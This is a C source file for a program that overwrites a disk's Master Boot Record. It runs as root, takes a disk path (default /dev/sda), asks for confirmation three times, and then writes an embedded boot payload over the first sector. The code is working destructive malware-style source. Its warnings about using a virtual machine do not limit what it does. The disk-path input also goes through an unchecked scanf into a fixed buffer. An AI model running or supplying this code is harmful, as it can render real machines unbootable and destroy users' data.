// Inpired by: https://github.com/MrEmpy/MBROverwrite

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"

#define DEFAULT_DISK "/dev/sda"

void areYouSure();

int main() {
  FILE* harddisk;

  if (geteuid() != 0) {
    printf(
        "You need to run this program as a root user.\nRemember that running "
        "this binary can lead to LOSS OF THE CURRENT SYSTEM, run it in a "
        "virtual machine.\n");
    return 1;
  }

  char DISK[50];
  strcpy(DISK, DEFAULT_DISK);
  // Get the path of the disk from input scanf
  printf("Enter the path of the disk (default: /dev/sda): ");
  scanf("%s", DISK);
  getchar();  // Remove newline character from buffer

  printf("WARNING: This program will overwrite the MBR of %s\n", DISK);
  printf("Press ENTER to continue or CTRL+C to abort\n");
  getchar();

  areYouSure();

  // Replace MBR
  printf("\nStarting in 5 seconds...\n");
  sleep(5);
  printf("Writing payload inside %s\n", DISK);
  harddisk = fopen(DISK, "wb");
  fseek(harddisk, 0, SEEK_SET);
  fwrite(boot_payload_bin, sizeof(boot_payload_bin), 1, harddisk);
  fclose(harddisk);

  printf("Done!\n");
  return 0;
}

void areYouSure() {
  printf("Are you sure? (y/N): ");
  char choice;
  scanf("%c", &choice);
  getchar();  // Remove newline character from buffer
  if (choice != 'y' && choice != 'Y') {
    printf("Aborting...\n");
    exit(0);
  }

  printf("Are you triple sure? (y/N): ");
  scanf("%c", &choice);
  getchar();  // Remove newline character from buffer
  if (choice != 'y' && choice != 'Y') {
    printf("Aborting...\n");
    exit(0);
  }
}